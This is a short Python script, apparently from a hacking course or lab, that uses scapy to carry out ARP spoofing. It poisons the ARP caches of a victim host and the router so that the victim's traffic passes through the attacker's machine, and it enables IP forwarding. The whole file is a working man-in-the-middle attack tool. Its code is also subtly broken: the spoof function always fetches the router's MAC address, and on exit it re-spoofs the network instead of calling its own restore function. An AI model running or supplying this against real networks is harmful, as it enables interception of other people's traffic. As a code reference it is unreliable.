#!/usr/bin/env python

import scapy.all as scapy
import time
import subprocess

# makes
#              VICTIM <--->
#                           ROUTER
#              HACKER <--->
# look like
#              VICTIM <---> HACKER <---> ROUTER
# for every victim's network request


def get_mac(ip):  # return mac of router
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(victim_ip, new_ip):
    victim_mac = get_mac("10.0.2.1")  # router ip
    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=new_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


# allow internet connection (for Linux only) --> (find similar command for your OS)
subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

target_ip = "10.0.2.7"
spoof_ip = "10.0.2.1"

sent_packets_count = 0
try:
    while True:
        spoof(target_ip, spoof_ip)
        spoof(spoof_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ...... Quitting!")
    spoof(target_ip, spoof_ip)
